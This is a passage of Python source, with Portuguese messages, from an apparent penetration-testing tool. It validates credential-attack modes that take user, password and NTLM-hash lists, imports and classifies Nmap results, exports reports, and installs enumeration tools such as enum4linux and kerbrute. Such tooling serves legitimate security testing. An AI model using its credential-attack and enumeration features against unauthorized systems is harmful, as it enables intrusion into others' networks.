        raise BirdScanUsageError(f"Lista de hashes inválida ou inexistente: {args.ntlm_hash_file}")
    validate_credential_attack_args(args)


def validate_credential_attack_args(args: argparse.Namespace) -> None:
    mode = getattr(args, "auth_attack_mode", "pitchfork") or "pitchfork"
    if mode in {"single-user", "single-pass"}:
        users = collect_credential_usernames(args)
        passwords = collect_credential_passwords(args)
        hashes = collect_credential_hashes(args)
        if not users or (not passwords and not hashes):
            raise BirdScanUsageError(
                f"Modo {mode} exige ao menos um usuário e uma senha/hash via -u/-p/--ntlm-hash ou arquivos de lista."
            )


def warn_credential_list_size_mismatch(
    args: argparse.Namespace,
    mode: str,
    users: list[str],
    passwords: list[str],
    logger: Logger,
    state: ScanState | None = None,
) -> None:
    if mode != "pitchfork" or not users or not passwords:
        return
    if len(users) == len(passwords):
        return
    message = (
        "Listas de usuários e senhas com tamanhos diferentes no modo pitchfork "
        f"({len(users)} usuário(s) vs {len(passwords)} senha(s)); "
        f"continuando com {min(len(users), len(passwords))} par(es) até a menor lista acabar."
    )
    logger.warn(message)
    if state is not None:
        state.metadata["credential_list_size_warning"] = message


def file_has_nmap_markers(path: Path) -> bool:
    try:
        sample = path.read_text(encoding="utf-8", errors="replace")[:262144]
    except OSError:
        return False
    return (
        looks_like_xml(sample)
        or "Nmap scan report for" in sample
        or "Discovered open port" in sample
        or ("Host:" in sample and ("Status:" in sample or "Ports:" in sample))
        or ("Ports:" in sample and re.search(r"/open(?:\||/)", sample) is not None)
        or ("Starting Nmap" in sample and "Nmap done:" in sample)
    )


def normalize_target_token(token: str) -> str:
    token = token.strip()
    if not token or token.startswith("#"):
        return ""
    if "#" in token:
        token = token.split("#", 1)[0].strip()
    token = token.strip().strip(",")
    return token


def split_target_values(value: str) -> list[str]:
    stripped = value.strip()
    if is_custom_nmap_command(stripped):
        return [stripped]
    parts: list[str] = []
    for raw in re.split(r"[\s,]+", value):
        token = normalize_target_token(raw)
        if token:
            parts.append(token)
    return parts


def is_custom_nmap_command(value: str) -> bool:
    return value.strip().startswith(("nmap ", "sudo nmap "))


def load_targets_from_file(path: Path) -> list[str]:
    if not path.exists():
        raise BirdScanUsageError(f"Arquivo de alvos inválido ou inexistente: {path}")
    targets: list[str] = []
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        targets.extend(split_target_values(line))
    return targets


def collect_targets(args: argparse.Namespace) -> list[str]:
    targets: list[str] = []
    if args.target:
        for value in args.target:
            targets.extend(split_target_values(value))
    if args.targets_file:
        targets.extend(load_targets_from_file(Path(args.targets_file)))
    unique: list[str] = []
    for target in targets:
        if target not in unique:
            unique.append(target)
    return unique


def validate_targets(targets: list[str]) -> tuple[list[str], list[str]]:
    valid: list[str] = []
    warnings: list[str] = []
    for target in targets:
        if is_custom_nmap_command(target):
            valid.append(target.strip())
            continue
        try:
            if "/" in target:
                ipaddress.ip_network(target, strict=False)
            else:
                ipaddress.ip_address(target)
            valid.append(target)
            continue
        except ValueError:
            pass
        if re.match(r"^[A-Za-z0-9_.-]+$", target):
            valid.append(target)
        else:
            warnings.append(f"Ignoring invalid target token: {target}")
    return valid, warnings


def setup_run(args: argparse.Namespace, logger: Logger) -> ScanState:
    if args.resume:
        resume_dir = Path(args.resume)
        state_file = resume_dir / "state.json"
        if not state_file.exists():
            raise BirdScanUsageError(f"Diretório de resume inválido: não encontrei {state_file}")
        state = load_state(state_file)
        state.output_dir = str(resume_dir.resolve())
        logger.info(f"Resuming run {state.run_id} from {resume_dir}")
        return state

    run_id = args.run_name or f"{now_slug()}-{uuid.uuid4().hex[:8]}"
    output_dir = Path(args.output_dir) / safe_filename(run_id)
    output_dir.mkdir(parents=True, exist_ok=True)
    for child in [
        output_dir / RAW_DIR,
        output_dir / RAW_DIR / "nmap",
        output_dir / RAW_DIR / "web",
        output_dir / RAW_DIR / "services",
        output_dir / "screenshots",
    ]:
        child.mkdir(parents=True, exist_ok=True)
    state = ScanState(
        run_id=run_id,
        started_at=dt.datetime.now().isoformat(timespec="seconds"),
        output_dir=str(output_dir),
    )
    state.metadata = {
        "app": APP_NAME,
        "version": APP_VERSION,
        "profile": args.profile,
        "threads_level": args.threads_level,
        "safe_default": True,
    }
    return state


def state_to_dict(state: ScanState) -> dict[str, Any]:
    return {
        "run_id": state.run_id,
        "started_at": state.started_at,
        "output_dir": state.output_dir,
        "targets": state.targets,
        "hosts": {ip: asdict(host) for ip, host in state.hosts.items()},
        "services": [asdict(service) for service in state.services],
        "web_endpoints": [asdict(endpoint) for endpoint in state.web_endpoints],
        "evidence": [asdict(item) for item in state.evidence],
        "dependencies": state.dependencies,
        "metadata": state.metadata,
    }


def load_state(path: Path) -> ScanState:
    try:
        return _load_state_checked(path)
    except (OSError, ValueError, KeyError, TypeError, AttributeError) as exc:
        raise BirdScanUsageError(f"Estado inválido ou ilegível em {path}: {type(exc).__name__}") from exc


def _load_state_checked(path: Path) -> ScanState:
    data = json.loads(path.read_text(encoding="utf-8"))
    if not isinstance(data, dict) or not isinstance(data.get("run_id"), str):
        raise ValueError("Invalid state envelope")
    for key in ("hosts", "dependencies", "metadata"):
        if not isinstance(data.get(key, {}), dict):
            raise ValueError(f"Invalid state field: {key}")
    for key in ("targets", "services", "web_endpoints", "evidence"):
        if not isinstance(data.get(key, []), list):
            raise ValueError(f"Invalid state field: {key}")
    state = ScanState(
        run_id=data["run_id"],
        started_at=data.get("started_at", ""),
        output_dir=data["output_dir"],
        targets=data.get("targets", []),
        dependencies=data.get("dependencies", {}),
        metadata=data.get("metadata", {}),
    )
    state.hosts = {}
    for ip, host_data in data.get("hosts", {}).items():
        host_data.setdefault("aliases", [])
        state.hosts[ip] = HostRecord(**host_data)
    state.services = [ServiceRecord(**item) for item in data.get("services", [])]
    state.web_endpoints = [WebEndpoint(**item) for item in data.get("web_endpoints", [])]
    state.evidence = [Evidence(**item) for item in data.get("evidence", [])]
    return state


def save_state(state: ScanState) -> None:
    output_dir = Path(state.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    path = output_dir / "state.json"
    with private_atomic_text(path) as handle:
        json.dump(state_to_dict(state), handle, indent=2, ensure_ascii=False)


def write_json_export(state: ScanState) -> Path:
    path = Path(state.output_dir) / "results.json"
    with private_atomic_text(path) as handle:
        json.dump(state_to_dict(state), handle, indent=2, ensure_ascii=False)
    return path


def write_csv_export(state: ScanState) -> Path:
    path = Path(state.output_dir) / "services.csv"
    with private_atomic_text(path) as handle:
        writer = csv.DictWriter(
            handle,
            fieldnames=["ip", "hostname", "aliases", "port", "protocol", "service", "product", "version", "state", "source"],
        )
        writer.writeheader()
        for service in sorted(state.services, key=lambda item: (item.ip, item.port)):
            host = state.hosts.get(service.ip, HostRecord(ip=service.ip))
            writer.writerow(
                {
                    "ip": service.ip,
                    "hostname": host.hostname or host.fqdn,
                    "aliases": ", ".join(host.aliases),
                    "port": service.port,
                    "protocol": service.protocol,
                    "service": service.service,
                    "product": service.product,
                    "version": service.version,
                    "state": service.state,
                    "source": service.source,
                }
            )
    return path


def write_markdown_export(state: ScanState) -> Path:
    path = Path(state.output_dir) / "summary.md"
    lines = [
        f"# {APP_NAME} - Summary",
        "",
        f"- Run: `{state.run_id}`",
        f"- Started: `{state.started_at}`",
        f"- Hosts: `{len(state.hosts)}`",
        f"- Services: `{len(state.services)}`",
        f"- Web endpoints: `{len(state.web_endpoints)}`",
        f"- Evidence items: `{len(state.evidence)}`",
        "",
        "## Prioritized Findings",
        "",
    ]
    prioritized = [item for item in state.evidence if item.severity in {"high", "medium", "low"} and not is_suppressed_evidence(item)]
    if not prioritized:
        lines.append("No prioritized findings were generated.")
    for item in prioritized:
        port = f":{item.port}" if item.port else ""
        lines.append(f"- **{item.severity.upper()}** `{item.ip}{port}` {item.title} - {item.description}")
    lines.extend(["", "## Services", ""])
    for service in sorted(state.services, key=lambda item: (item.ip, item.port)):
        descriptor = " ".join(part for part in [service.service, service.product, service.version] if part)
        lines.append(f"- `{service.ip}:{service.port}/{service.protocol}` {descriptor}".rstrip())
    private_write_text(path, "\n".join(lines) + "\n")
    return path


def check_dependencies(state: ScanState, logger: Logger) -> dict[str, bool]:
    deps = {tool: has_tool(tool) for tool in DEPENDENCIES}
    state.dependencies = deps
    missing = [tool for tool, present in deps.items() if not present]
    logger.info("Dependency check:")
    for tool, present in deps.items():
        if not present:
            logger.info(f"  {tool}: missing")
    if missing:
        required_missing = [tool for tool in missing if tool not in OPTIONAL_DEPENDENCIES]
        optional_missing = [tool for tool in missing if tool in OPTIONAL_DEPENDENCIES]
        if required_missing:
            logger.warn("Missing required/feature tools: " + ", ".join(required_missing))
        if optional_missing:
            logger.warn("Missing optional tools (automatic installation disabled): " + ", ".join(optional_missing))
    return deps


def verify_enum4linux_runtime(state: ScanState, logger: Logger) -> bool:
    """Verify that enum4linux is executable, not merely present in PATH."""
    if not has_tool("enum4linux"):
        state.metadata["enum4linux_ready"] = False
        logger.warn("enum4linux não foi encontrado; a instalação automática será necessária.")
        return False
    output_file = Path(state.output_dir) / RAW_DIR / "dependencies" / "enum4linux-healthcheck.txt"
    result = run_command(["enum4linux", "-h"], timeout=15, output_file=output_file, logger=logger)
    combined = result.stdout + result.stderr
    ready = result.returncode == 0 and "enum4linux" in combined.lower() and "usage" in combined.lower()
    state.metadata["enum4linux_ready"] = ready
    state.metadata["enum4linux_healthcheck"] = relpath(output_file, state.output_dir)
    if ready:
        version = extract_regex(combined, r"enum4linux\s+v?([0-9][^\s]*)") or "detectada"
        logger.info(f"enum4linux {version}: executável e pronto para credenciais SMB válidas")
    else:
        logger.warn("enum4linux existe, mas não respondeu corretamente ao health check.")
    return ready


def log_startup_context(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    logger.stage(f"{APP_NAME} v{APP_VERSION}", f"execução {state.run_id}")
    logger.info(f"Saída: {state.output_dir}")
    logger.info(f"Perfil: {args.profile} · concorrência: nível {args.threads_level}")
    logger.info("Fluxo: descoberta → enumeração → autenticação → pós-auth → relatório")
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        logger.info("Privilégios: root confirmado")
    else:
        logger.warn("Execute a ferramenta como root para Nmap SYN/OS, mount CIFS e instalação de dependências funcionarem sem interrupções.")


def install_missing_dependencies(state: ScanState, deps: dict[str, bool], logger: Logger) -> dict[str, bool]:
    missing_tools = [tool for tool, present in deps.items() if not present]
    if not missing_tools:
        return deps
    installable_tools = [tool for tool in missing_tools if tool not in OPTIONAL_DEPENDENCIES]
    skipped_optional = [tool for tool in missing_tools if tool in OPTIONAL_DEPENDENCIES]
    if "mongosh" in skipped_optional and apt_package_has_candidate("mongosh"):
        # Use only a package already exposed by the operator's configured
        # repositories.  Never add MongoDB's distro-specific repository here.
        installable_tools.append("mongosh")
        skipped_optional.remove("mongosh")
        logger.info("mongosh encontrado no cache APT existente; usando apenas os sources já configurados.")
    if skipped_optional:
        logger.warn(
            "Instalação automática desativada para dependências opcionais: "
            + ", ".join(skipped_optional)
            + ". Nenhum repositório APT será adicionado ou alterado."
        )
    if not installable_tools:
        return check_dependencies(state, logger)
    if not has_tool("apt-get"):
        logger.warn("apt-get não encontrado; não foi possível instalar dependências automaticamente.")
        return deps
    
    packages = sorted(list({DEPENDENCY_PACKAGES.get(tool, tool) for tool in installable_tools}))

    # Se gowitness estiver faltando, vamos precisar de go
    needs_go = "gowitness" in missing_tools and not has_tool("go")
    # Se dirsearch estiver faltando, talvez precisaremos de pip
    needs_pip = "dirsearch" in missing_tools and not has_tool("pip3")
    # Downloads are needed only for tools with an explicit standalone fallback.
    needs_wget = False

    if "kerbrute" in installable_tools:
        needs_wget = True

    if needs_go:
        packages.append("golang-go")
    if needs_pip:
        packages.extend(["python3-pip", "python3-venv", "pipx"])
    if needs_wget:
        packages.append("wget")

    command: list[str] = []
    use_sudo = False
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        if not has_tool("sudo"):
            logger.warn("sudo não encontrado; instalações que exigem root podem falhar.")
        else:
            command.append("sudo")
            use_sudo = True
    command.extend(["apt-get", "update"])
    raw_dir = Path(state.output_dir) / RAW_DIR / "dependencies"
    raw_dir.mkdir(parents=True, exist_ok=True)
    logger.info("Updating apt cache before dependency installation")
    update_result = run_command(
        command,
        timeout=900,
        output_file=raw_dir / "apt-update.command.txt",
        logger=logger,
    )
    if update_result.returncode != 0:
        logger.warn("apt-get update falhou; prosseguindo com cache antigo e métodos alternativos (pip/wget).")
    # Install packages one by one to avoid total failure on single missing package
    logger.info("Installing via APT: " + ", ".join(packages))
    for pkg in packages:
        install_result = run_command(
            command[:-1] + ["install", "-y", pkg],
            timeout=300,
            output_file=raw_dir / f"apt-install-{pkg}.command.txt",
            logger=logger,
        )
        if install_result.returncode != 0:
            logger.warn(f"apt-get install {pkg} falhou; pacote pode não existir no repositório.")

    sudo_prefix = ["sudo"] if use_sudo else []

    # Instalação customizada: Kerbrute via GitHub Release
    if "kerbrute" in installable_tools:
        logger.warn("Instalação automática de Kerbrute desativada: não há artefato com versão e checksum verificados.")

    # Instalação customizada: Gowitness via Go
    if "gowitness" in installable_tools and has_tool("go"):
        logger.info("Installing Gowitness via Go...")
        go_env_result = run_command(["go", "env", "GOPATH"], timeout=10, logger=logger)
        gopath = go_env_result.stdout.strip() or f"{os.environ.get('HOME', '/root')}/go"
        run_command(["go", "install", "github.com/sensepost/gowitness@latest"], timeout=600, logger=logger)
        go_bin = Path(gopath) / "bin" / "gowitness"
        if go_bin.exists():
            run_command(sudo_prefix + ["ln", "-sf", str(go_bin), "/usr/local/bin/gowitness"], timeout=10, logger=logger)

    # Instalação customizada: Dirsearch via pip3 fallback
    if "dirsearch" in installable_tools and not has_tool("dirsearch"):
        if has_tool("pipx"):
            logger.info("Installing Dirsearch via pipx...")
            run_command(["pipx", "install", "dirsearch"], timeout=300, logger=logger)
            run_command(sudo_prefix + ["pipx", "ensurepath"], timeout=30, logger=logger)
        elif has_tool("pip3"):
            logger.info("Installing Dirsearch via pip3...")
            run_command(["pip3", "install", "dirsearch", "--break-system-packages"], timeout=300, logger=logger)

    return check_dependencies(state, logger)


def parse_ip_port_file(path: Path, state: ScanState, logger: Logger) -> None:
    if not path.exists():
        raise BirdScanUsageError(f"Arquivo IP:PORT inválido ou inexistente: {path}")
    logger.info(f"Importing IP:PORT data from {path}")
    parsed_count = 0
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        stripped = normalize_target_token(line)
        if not stripped:
            continue
        matches = re.findall(r"(?:\[([0-9A-Fa-f:]+)\]|([A-Za-z0-9_.-]+)):(\d{1,5})(?:/(tcp|udp))?", stripped, flags=re.I)
        if not matches:
            continue
        for ipv6_host, named_host, port_text, proto in matches:
            try:
                port = int(port_text)
            except ValueError:
                continue
            if not 1 <= port <= 65535:
                continue
            ip = ipv6_host or named_host
            state.upsert_host(ip, sources=["ip-port-import"])
            state.add_service(
                ServiceRecord(
                    ip=ip,
                    port=port,
                    protocol=(proto or "tcp").lower(),
                    service=guess_service_by_port(port),
                    source=f"ip-port:{path.name}",
                )
            )
            parsed_count += 1
    if parsed_count == 0:
        raise BirdScanUsageError(f"Arquivo IP:PORT não contém entradas válidas no formato IP:PORT: {path}")


def guess_service_by_port(port: int) -> str:
    mapping = {
        21: "ftp",
        22: "ssh",
        23: "telnet",
        25: "smtp",
        53: "domain",
        80: "http",
        88: "kerberos",
        110: "pop3",
        111: "rpcbind",
        135: "msrpc",
        139: "netbios-ssn",
        143: "imap",
        389: "ldap",
        443: "https",
        445: "microsoft-ds",
        464: "kpasswd",
        465: "smtps",
        587: "submission",
        593: "http-rpc-epmap",
        636: "ldaps",
        873: "rsync",
        993: "imaps",
        995: "pop3s",
        1433: "ms-sql-s",
        1521: "oracle",
        2049: "nfs",
        2375: "docker",
        2376: "docker-tls",
        3000: "http-alt",
        3306: "mysql",
        3389: "ms-wbt-server",
        5432: "postgresql",
        5601: "kibana",
        5900: "vnc",
        5985: "wsman",
        5986: "wsmans",
        6379: "redis",
        6443: "kubernetes",
        8000: "http-alt",
        8080: "http-proxy",
        8081: "http-alt",
        8443: "https-alt",
        9200: "elasticsearch",
        9300: "elasticsearch",
        27017: "mongodb",
    }
    return mapping.get(port, "")


def resolve_nmap_import_paths(path: Path) -> list[Path]:
    candidates: list[Path] = []
    inputs = expand_glob_paths(path) if path_has_glob(path) else [path]
    for item_path in inputs:
        if item_path.is_dir():
            for pattern in ("*.xml", "*.gnmap", "*.nmap", "nmap*", "*"):
                candidates.extend(sorted(item for item in item_path.glob(pattern) if item.is_file()))
        else:
            if not item_path.suffix:
                candidates.extend(
                    [
                        item_path.with_suffix(".xml"),
                        item_path.with_suffix(".gnmap"),
                        item_path.with_suffix(".nmap"),
                    ]
                )
            candidates.append(item_path)

    unique: list[Path] = []
    seen: set[Path] = set()
    for candidate in candidates:
        resolved = candidate.resolve() if candidate.exists() else candidate
        if resolved in seen:
            continue
        try:
            is_candidate = candidate.exists() and candidate.is_file() and candidate.stat().st_size > 0
        except OSError:
            is_candidate = False
        if is_candidate and file_has_nmap_markers(candidate):
            unique.append(candidate)
            seen.add(resolved)
    return unique


def path_has_glob(path: Path) -> bool:
    return any(char in str(path) for char in "*?[")


def expand_glob_paths(path: Path) -> list[Path]:
    return [Path(item) for item in sorted(glob.glob(str(path)))]


def import_nmap_path(path: Path, state: ScanState, logger: Logger) -> None:
    paths = resolve_nmap_import_paths(path)
    if not paths:
        raise BirdScanUsageError(
            f"Arquivo/prefixo Nmap inválido ou vazio: {path}. "
            "Se for um prefixo -oA, mantenha os arquivos .xml/.gnmap/.nmap ao lado dele."
        )
    before_hosts = len(state.hosts)
    before_services = len(state.services)
    before_aliases = count_host_aliases(state)
    for candidate in paths:
        stored_candidate = store_imported_nmap_file(candidate, state, logger)
        parse_nmap_file(stored_candidate, state, logger)
    imported_hosts = len(state.hosts) - before_hosts
    imported_services = len(state.services) - before_services
    imported_aliases = count_host_aliases(state) - before_aliases
    logger.info(
        f"Nmap import summary for {path}: +{imported_hosts} unique hosts, +{imported_aliases} aliases, +{imported_services} services "
        f"from {len(paths)} file(s)"
    )
    if imported_hosts == 0 and imported_services == 0:
        logger.warn(
            f"Nenhum host/serviço útil foi importado de {path}; mantendo a execução para aproveitar os demais arquivos Nmap."
        )


def count_host_aliases(state: ScanState) -> int:
    return sum(len(host.aliases) for host in state.hosts.values())


def store_imported_nmap_file(path: Path, state: ScanState, logger: Logger) -> Path:
    output_dir = Path(state.output_dir)
    try:
        path.resolve().relative_to(output_dir.resolve())
        return path
    except ValueError:
        pass
    import_dir = output_dir / RAW_DIR / "nmap" / "imported"
    import_dir.mkdir(parents=True, exist_ok=True)
    suffix = path.suffix or ".nmap"
    target = import_dir / f"{safe_filename(path.stem or path.name)}{suffix}"
    if target.exists() and target.resolve() != path.resolve():
        target = import_dir / f"{safe_filename(path.stem or path.name)}-{uuid.uuid4().hex[:8]}{suffix}"
    shutil.copy2(path, target)
    logger.debug(f"Stored imported Nmap output: {target}")
    return target


def parse_nmap_file(path: Path, state: ScanState, logger: Logger) -> bool:
    """Parse an Nmap output file. Returns True if parsing succeeded."""
    if not path.exists():
        raise BirdScanError(f"Nmap file not found: {path}")
    text = path.read_text(encoding="utf-8", errors="replace")
    if looks_like_xml(text):
        logger.info(f"Importing Nmap XML from {path}")
        if not parse_nmap_xml(text, state, source=path.name, raw_file=relpath(path, state.output_dir), logger=logger):
            return False
    elif looks_like_gnmap(text):
        logger.info(f"Importing Nmap greppable data from {path}")
        parse_nmap_gnmap(text, state, source=path.name)
    else:
        logger.info(f"Importing Nmap normal output from {path}")
        parse_nmap_normal(text, state, source=path.name)
    return True


def looks_like_xml(text: str) -> bool:
    sample = text.lstrip()[:300]
    return sample.startswith("<?xml") or sample.startswith("<nmaprun")


def looks_like_gnmap(text: str) -> bool:
    for line in text.splitlines():
        if line.startswith("Host:") and ("Status:" in line or "Ports:" in line):
            return True
    return False


def parse_nmap_xml(text: str, state: ScanState, source: str, raw_file: str = "", logger: Logger | None = None) -> bool:
    """Parse Nmap XML. Returns True on success, False on parse error."""
    try:
        root = ET.fromstring(text)
    except ET.ParseError as exc:
        if logger:
            logger.warn(f"XML Nmap malformado (possivelmente truncado): {exc}; tentando outros formatos")
        return False
    for host in root.findall("host"):
        status = host.find("status")
        if status is not None and status.attrib.get("state") not in {None, "up"}:
            continue
        address = ""
        for addr in host.findall("address"):
            if addr.attrib.get("addrtype") in {"ipv4", "ipv6"}:
                address = addr.attrib.get("addr", "")
                break
        if not address:
            continue
        hostname = ""
        fqdn = ""
        aliases: list[str] = []
        hostnames = host.find("hostnames")
        if hostnames is not None:
            for hn in hostnames.findall("hostname"):
                name = hn.attrib.get("name", "").strip().strip(".")
                if not name:
                    continue
                aliases.append(name)
                if not hostname:
                    hostname = name
                if "." in name and not fqdn:
                    fqdn = name
        os_guess = ""
        os_node = host.find("os")
        if os_node is not None:
            osmatch = os_node.find("osmatch")
            if osmatch is not None:
                os_guess = osmatch.attrib.get("name", "")
        state.upsert_host(address, hostname=hostname, fqdn=fqdn, aliases=aliases, os_guess=os_guess, sources=[f"nmap:{source}"])
        ports = host.find("ports")
        if ports is None:
            continue
        for port_node in ports.findall("port"):
            protocol = port_node.attrib.get("protocol", "tcp")
            try:
                port_id = int(port_node.attrib.get("portid", "0"))
            except ValueError:
                continue
            state_node = port_node.find("state")
            port_state = state_node.attrib.get("state", "") if state_node is not None else ""
            if port_state != "open":
                continue
            service_node = port_node.find("service")
            service_name = ""
            product = ""
            version = ""
            banner = ""
            if service_node is not None:
                service_name = service_node.attrib.get("name", "")
                product = service_node.attrib.get("product", "")
                version = " ".join(
                    part for part in [
                        service_node.attrib.get("version", ""),
                        service_node.attrib.get("extrainfo", ""),
                    ] if part
                )
                banner = service_node.attrib.get("tunnel", "")
            state.add_service(
                ServiceRecord(
                    ip=address,
                    port=port_id,
                    protocol=protocol,
                    service=service_name or guess_service_by_port(port_id),
                    product=product,
                    version=version,
                    banner=banner,
                    state="open",
                    source=f"nmap:{source}",
                )
            )
            for script in port_node.findall("script"):
                add_nmap_script_evidence(state, address, port_id, service_name or guess_service_by_port(port_id), script, source, raw_file)
        hostscript = host.find("hostscript")
        if hostscript is not None:
            for script in hostscript.findall("script"):
                add_nmap_script_evidence(state, address, None, "host", script, source, raw_file)
    return True

def add_nmap_script_evidence(
    state: ScanState,
    ip: str,
    port: int | None,
    service: str,
    script: ET.Element,
    source: str,
    raw_file: str = "",
) -> None:
    script_id = script.attrib.get("id", "").strip()
    output = normalize_script_output(script.attrib.get("output", ""))
    if not script_id or not output:
        return
    classification = classify_nmap_script(script_id, output)
    if classification is None:
        return
    category, severity, title, description = classification
    state.add_evidence(
        Evidence(
            category=category,
            ip=ip,
            port=port,
            service=service or "nmap-script",
            title=title,
            description=description,
            severity=severity,
            raw_output_file=raw_file,
            data={
                "script_id": script_id,
                "source": source,
                "output": output[:4000],
            },
        )
    )


def normalize_script_output(output: str) -> str:
    output = html.unescape(output or "")
    output = output.replace("\r\n", "\n").replace("\r", "\n")
    output = re.sub(r"\n{3,}", "\n\n", output)
    return output.strip()


def classify_nmap_script(script_id: str, output: str) -> tuple[str, str, str, str] | None:
    lower_id = script_id.lower()
    lower_output = output.lower()
    if not output.strip():
        return None
    negative_markers = [
        "couldn't find",
        "could not find",
        "not vulnerable",
        "no vulnerabilities found",
        "no csrf vulnerabilities",
        "no dom based xss",
        "no stored xss",
    ]
    if any(marker in lower_output for marker in negative_markers):
        return None
    if "error: script execution failed" in lower_output:
        return None
    if is_nmap_risk_script(script_id, output):
        return None
    if lower_id in {"http-enum", "http-server-header"} or lower_id.startswith("http-"):
        interesting = any(token in lower_output for token in ["/admin", "/login", "/api", "phpmyadmin", "server:", "apache", "nginx", "iis"])
        if interesting:
            return ("web", "low", f"Nmap HTTP finding: {script_id}", first_meaningful_line(output))
    if lower_id in {"fingerprint-strings", "banner"}:
        return ("service", "info", f"Nmap fingerprint: {script_id}", first_meaningful_line(output))
    return None


def is_nmap_risk_script(script_id: str, output: str) -> bool:
    haystack = f"{script_id}\n{output}".lower()
    markers = [
        "cve-",
        "cvss",
        "exploit",
        "vulnerab",
        "vulners",
        "vulscan",
        "vuln",
    ]
    return any(marker in haystack for marker in markers)


def is_suppressed_evidence(item: Evidence) -> bool:
    text_parts = [
        item.category,
        item.service,
        item.title,
        item.description,
    ]
    for key, value in item.data.items():
        text_parts.append(str(key))
        text_parts.append(str(value))
    haystack = "\n".join(text_parts).lower()
    if item.category.lower() == "vulnerability":
        return True
    return is_nmap_risk_script(str(item.data.get("script_id", "")), haystack)


def prune_suppressed_evidence(state: ScanState) -> None:
    state.evidence = [item for item in state.evidence if not is_suppressed_evidence(item)]


def prune_unreportable_web_endpoints(state: ScanState) -> None:
    state.web_endpoints = [endpoint for endpoint in state.web_endpoints if has_http_response(endpoint)]


def parse_cvss_scores(output: str) -> list[float]:
    scores: list[float] = []
    for match in re.finditer(r"(?:CVSS[:\s]*|CVE-\d{4}-\d{4,7}\s+)(10\.0|[0-9]\.[0-9])", output, flags=re.I):
        try:
            scores.append(float(match.group(1)))
        except ValueError:
            continue
    return scores


def first_meaningful_line(output: str) -> str:
    for line in output.splitlines():
        cleaned = line.strip(" |_-")
        if cleaned:
            return cleaned[:500]
    return output[:500]


def parse_nmap_gnmap(text: str, state: ScanState, source: str) -> None:
    for line in text.splitlines():
        if not line.startswith("Host:"):
            continue
        host_match = re.match(r"Host:\s+(\S+)\s+\(([^)]*)\)", line)
        if not host_match:
            continue
        ip, hostname = host_match.groups()
        if "Status:" in line:
            status = extract_regex(line, r"Status:\s*([A-Za-z]+)").lower()
            if status and status != "up":
                continue
        state.upsert_host(ip, hostname=hostname if hostname else "", aliases=[hostname] if hostname else [], sources=[f"gnmap:{source}"])
        if "Ports:" not in line:
            continue
        match = re.search(r"Ports:\s+([^\t]+)", line)
        if not match:
            continue
        ports_text = match.group(1)
        for entry in ports_text.split(","):
            parts = entry.strip().split("/")
            if len(parts) < 5:
                continue
            try:
                port = int(parts[0])
            except ValueError:
                continue
            if not parts[1].startswith("open"):
                continue
            protocol = parts[2] or "tcp"
            service = parts[4] or guess_service_by_port(port)
            product = parts[6] if len(parts) > 6 else ""
            version = parts[7] if len(parts) > 7 else ""
            state.add_service(
                ServiceRecord(
                    ip=ip,
                    port=port,
                    protocol=protocol,
                    service=service,
                    product=product,
                    version=version,
                    source=f"gnmap:{source}",
                )
            )


def parse_nmap_normal(text: str, state: ScanState, source: str) -> None:
    current_ip = ""
    current_hostname = ""
    in_ports = False
    ports_have_version = False
    ports_have_reason = False
    for line in text.splitlines():
        host_match = re.match(r"Nmap scan report for\s+(.+)$", line)
        if host_match:
            target_text = host_match.group(1).strip()
            current_ip, current_hostname = parse_nmap_report_target(target_text)
            if current_ip:
                state.upsert_host(current_ip, hostname=current_hostname, aliases=[current_hostname], sources=[f"nmap-normal:{source}"])
            in_ports = False
            ports_have_version = False
            ports_have_reason = False
            continue
        rdns_match = re.match(r"rDNS record for\s+(\S+):\s+(.+)$", line)
        if rdns_match:
            ip, rdns_name = rdns_match.groups()
            state.upsert_host(ip, fqdn=rdns_name.strip(), aliases=[rdns_name.strip()], sources=[f"nmap-rdns:{source}"])
            continue
        if re.match(r"PORT\s+STATE\s+SERVICE", line):
            in_ports = True
            header = line.upper()
            ports_have_version = "VERSION" in header
            ports_have_reason = "REASON" in header
            continue
        if in_ports and current_ip:
            if not line.strip():
                in_ports = False
                continue
            port_match = re.match(r"(\d+)/(tcp|udp)\s+(\S+)\s+(\S+)(?:\s+(.*))?$", line.strip())
            if not port_match:
                continue
            port_text, proto, port_state, service, rest = port_match.groups()
            if not port_state.startswith("open"):
                continue
            rest_for_version = strip_nmap_reason_prefix(rest or "") if ports_have_version and ports_have_reason else (rest or "")
            product, version = parse_nmap_product(rest_for_version) if ports_have_version else ("", "")
            state.add_service(
                ServiceRecord(
                    ip=current_ip,
                    port=int(port_text),
                    protocol=proto,
                    service=service or guess_service_by_port(int(port_text)),
                    product=product,
                    version=version,
                    banner=(rest or "") if not ports_have_version and not ports_have_reason else "",
                    state=port_state,
                    source=f"nmap-normal:{source}",
                )
            )
    parse_nmap_discovered_open_ports(text, state, source)


def parse_nmap_product(rest: str | None) -> tuple[str, str]:
    if not rest:
        return "", ""
    cleaned = re.sub(r"\s+", " ", rest).strip()
    if not cleaned:
        return "", ""
    parts = cleaned.split(" ", 1)
    product = parts[0]
    version = parts[1] if len(parts) > 1 else ""
    return product, version


def strip_nmap_reason_prefix(rest: str) -> str:
    rest = re.sub(r"^\S+\s+ttl\s+\d+\s*", "", rest.strip(), flags=re.I)
    rest = re.sub(r"^(?:syn-ack|reset|conn-refused|echo-reply|user-set|localhost-response)\s+", "", rest, flags=re.I)
    return rest.strip()


def parse_nmap_discovered_open_ports(text: str, state: ScanState, source: str) -> None:
    for match in re.finditer(r"Discovered open port\s+(\d+)/(tcp|udp)\s+on\s+(\S+)", text, flags=re.I):
        port_text, proto, ip = match.groups()
        port = int(port_text)
        state.upsert_host(ip, sources=[f"nmap-discovered:{source}"])
        state.add_service(
            ServiceRecord(
                ip=ip,
                port=port,
                protocol=proto.lower(),
                service=guess_service_by_port(port),
                state="open",
                source=f"nmap-discovered:{source}",
            )
        )


def parse_nmap_report_target(value: str) -> tuple[str, str]:
    paren_match = re.match(r"(.+?)\s+\(([^)]+)\)$", value)
    if paren_match:
        hostname = paren_match.group(1).strip()
        ip = paren_match.group(2).strip()
        return ip, hostname
    return value, ""


def build_nmap_command(args: argparse.Namespace, targets: list[str], output_prefix: Path) -> list[str]:
    thread_conf = THREAD_LEVELS[args.threads_level]
    profile = PROFILE_DEFAULTS[args.profile]
    command: list[str] = []
    if args.sudo_nmap:
        command.append("sudo")
